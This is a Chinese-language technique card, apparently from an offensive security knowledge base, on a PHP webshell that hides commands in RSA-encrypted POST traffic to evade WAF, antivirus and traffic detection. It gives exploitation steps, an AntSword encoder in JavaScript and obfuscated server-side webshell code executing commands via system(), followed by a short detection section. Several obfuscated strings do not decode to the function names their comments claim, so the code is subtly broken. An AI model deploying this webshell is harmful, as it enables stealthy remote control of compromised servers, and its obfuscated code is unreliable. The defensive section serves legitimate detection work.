---
id: web-php-rce-webshell-rsa-traffic-encoder
title: PHP WebShell RSA 加密流量编码器（蚁剑 myencoder）
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-rsa-traffic-encoding
aliases:
- 蚁剑 RSA 编码器
- myencoder 编码器
- WebShell 流量加密
- RSA 加密 webshell 流量
- openssl_public_decrypt 解密 webshell
- 加密 WebShell 免杀
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- webshell
- rsa
- traffic-encryption
- antsword
- av-bypass
- waf-bypass
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:46:34+08:00'
  notes: 已对照原文与图 04-05 核对：蚁剑 myencoder 按 80 字符分块 encryptPrivate 后用竖线连接、服务端 openssl_pkey_get_public/openssl_public_decrypt/base64_decode/explode 取反还原并 array_map('system') 执行、4509 字节密文回显 systeminfo；均与原文一致；PoC 未在本机执行。
---

## 一句话结论

客户端用 RSA 私钥把命令分块加密后以 Base64 放入 POST 参数，服务端 WebShell 内置公钥并用 `openssl_public_decrypt` 解密还原命令再交给 `array_map('system', ...)` 执行；网络流量与请求体中只有随机化的密文，没有明文命令或 PHP 关键字，可绕过基于内容的 WAF/AV 与流量检测。

## 原理

- 普通 WebShell 的请求体通常是 `cmd=whoami` 这样的明文，WAF/IDS/EDR 可以直接匹配命令关键字或 `eval($_POST[...])` 结构。
- 该编码器在客户端把控制器下发的原始 payload 按长度切块（每块约 80 字符），用 RSA 私钥对每块做私钥运算并 Base64 编码，块之间用 `|` 连接，整体放入 POST 参数。请求体因此是 Base64 密文，不含命令明文。
- 服务端 WebShell 内嵌对应公钥，按 `|` 分块、Base64 解码、`openssl_public_decrypt` 还原出命令，拼接后交给 `array_map('system', [cmd])` 执行。RSA 私钥运算的结果可被公钥还原，这是 RSA 的数学性质；用私钥加密、公钥解密的组合在功能上等价于“只有持有私钥的客户端能生成服务端可解密的命令”。
- 分块的作用是规避单块密文长度/熵特征，并绕过对请求体长度的简单限制。
- WebShell 自身的函数名同样用按位取反等方式混淆（`openssl_pkey_get_public`、`openssl_public_decrypt`、`base64_decode`、`explode`、`|` 分隔符都通过 `~` 还原），静态文件扫描同样看不到敏感函数名。
- 安全性边界：公钥写在 WebShell 文件里，任何拿到该文件的人都能解密流量，因此它主要对抗的是网络侧与静态检测，而不是提供真正的端到端保密；服务端也不校验请求者身份，只依赖解密是否成功。

## 触发条件

- 目标 PHP 启用 openssl 扩展（`openssl_pkey_get_public`、`openssl_public_decrypt` 可用）；
- WebShell 已落地并可访问；
- 客户端（蚁剑等）支持自定义编码器，能配置同一对 RSA 密钥；
- 服务端允许 `system` 或可替换的命令执行函数。

## 利用步骤

1. 生成 RSA 密钥对，把公钥嵌入服务端 WebShell。
2. 服务端 WebShell 实现：取 POST 参数 → 按 `|` 分块 → Base64 解码 → `openssl_public_decrypt` → 拼接命令。
3. 在蚁剑中编写自定义编码器：取原始 payload，按约 80 字符分块，用 `ext['rsa'].encryptPrivate(block, 'base64')` 加密，块间用 `|` 连接，替换原参数。
4. 配置编码器为 `myencoder`，连接 WebShell。
5. 执行命令时，客户端发送密文，服务端解密执行并回显；Wireshark 中只看到 Base64 密文与长请求体。

## PoC

客户端编码器（蚁剑）：

```javascript
'use strict';
module.exports = (pwd, data, ext = {}) => {
    const rawPayload = data['_'];
    const n = Math.ceil(rawPayload.length / 80);
    const blockLen = Math.ceil(rawPayload.length / n);
    const blocks = [];
    for (let i = 0; i < n; i++) {
        const block = rawPayload.substr(i * blockLen, blockLen);
        blocks.push(ext['rsa'].encryptPrivate(block, 'base64'));
    }
    data[pwd] = blocks.join('|');
    delete data['_'];
    return data;
};
```

服务端核心逻辑（函数名已用取反混淆，注释为还原后的明文）：

```php
$_     = ~("\x9E\x8D\x8D"."\x9E\x86\xA0"."\x92\x9E\x8F");            // array_map
$__    = ~("\x8C\x86\x8C"."\x8B\x9A\x92");                          // system
$___   = ~("\xA0"."\xAF\xB0"."\xAC\xAB");                            // _POST
$____  = ~("\x9C"."\x92\x9B");                                      // cmd
$_pkf  = ~("\x90\x91\x8D\x9A\x93\x8C\x8C\x9C\x97\x9E\x8A\x9F\x9A\x8C\x9E\x8D\x9F\x96\x9B\x8F\x9E\x8C"); // openssl_pkey_get_public
$_decf = ~("\x90\x91\x8D\x9A\x93\x8C\x8C\x9C\x91\x96\x9B\x8F\x9E\x8C\x9B\x8D\x9A\x8B\x9C\x8A\x8D");   // openssl_public_decrypt
$_b64  = ~("\x8C\x9E\x8C\x8D\x9E\x9B\x9C\x8B\x9A\x9B\x90\x9A\x8D");                                  // base64_decode
$_exp  = ~("\x9A\x87\x91\x8F\x90\x8B\x9A");                                                          // explode
$_sep  = ~("\x83");                                                                                   // |

$pubkey = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----";
$enc_cmd = @${$___}[$____];
if (!empty($enc_cmd)) {
    $blocks = $_exp($_sep, $enc_cmd);
    $pk = $_pkf($pubkey);
    $cmd = '';
    foreach ($blocks as $block) {
        $decoded = $_b64($block);
        $de = '';
        if ($_decf($decoded, $de, $pk)) {
            $cmd .= $de;
        }
    }
    $_($__, [$cmd]);
}
```

原文实测：蚁剑配置 `myencoder` 后连接成功，Wireshark 中命令请求体为约 4509 字节的 Base64 密文，响应正常回显 `systeminfo` 等命令结果。

## 变体与关联

- 与“字符串按位取反 + 可变变量 + array_map 动态调用”的静态免杀配合使用，形成文件层与流量层双重绕过（见独立卡片）。
- 编码器可换成 AES 对称加密（冰蝎/哥斯拉思路），但对称密钥随文件分发，泄露后流量可被解密；RSA 方案私钥只在客户端。
- 可把 `openssl_public_decrypt` 换成 `openssl_verify`、签名校验等变体，或叠加压缩/编码改变密文特征。

## 检测与防御

- 静态审计 PHP 文件中的 `openssl_public_decrypt`、`openssl_pkey_get_public`、`base64_decode`、`explode` 等组合，即使函数名被 `~` 混淆，也应先做脱混淆还原再扫描。
- 流量侧检测大体积、高熵、Base64 且带 `|` 分隔的 POST 参数，以及固定路径上异常长度的请求体；对 WebShell 常见参数名建立行为基线。
- 运行时监控 PHP 进程执行 `system`/`exec`/`shell_exec` 等，EDR 捕获 `execve` 链比流量特征更可靠。
- 禁用 openssl 相关危险函数或限制 Web 进程的 openssl 使用；上传目录禁止 PHP 解析；对 Web 目录做文件完整性监控。
- 注意该方案不提供真正的保密性：公钥随 WebShell 文件泄露，拿到文件即可解密流量。
